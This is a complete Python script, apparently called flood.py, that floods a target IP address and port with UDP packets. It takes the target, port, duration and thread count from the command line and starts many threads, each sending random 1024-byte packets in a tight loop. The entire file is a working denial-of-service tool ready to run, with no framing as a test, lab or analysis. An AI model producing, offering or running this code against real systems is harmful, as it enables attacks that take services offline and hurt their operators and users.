import socket
import threading
import time
import sys
import random

def flood(target, port, duration, threads):
    # Prepare a random packet of 1024 bytes
    data = random._urandom(1024)
    end_time = time.time() + duration
    
    def worker():
        # Using UDP socket for high speed
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end_time:
            try:
                client.sendto(data, (target, port))
            except:
                pass
        client.close()

    # Launch threads
    thread_list = []
    print(f"Starting flood on {target}:{port} for {duration} seconds with {threads} threads...")
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)

    # Wait for all threads to finish
    for t in thread_list:
        t.join()
    print("Flood finished.")

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python3 flood.py <target> <port> <time> <threads>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration_secs = int(sys.argv[3])
    num_threads = int(sys.argv[4])

    flood(target_ip, target_port, duration_secs, num_threads)
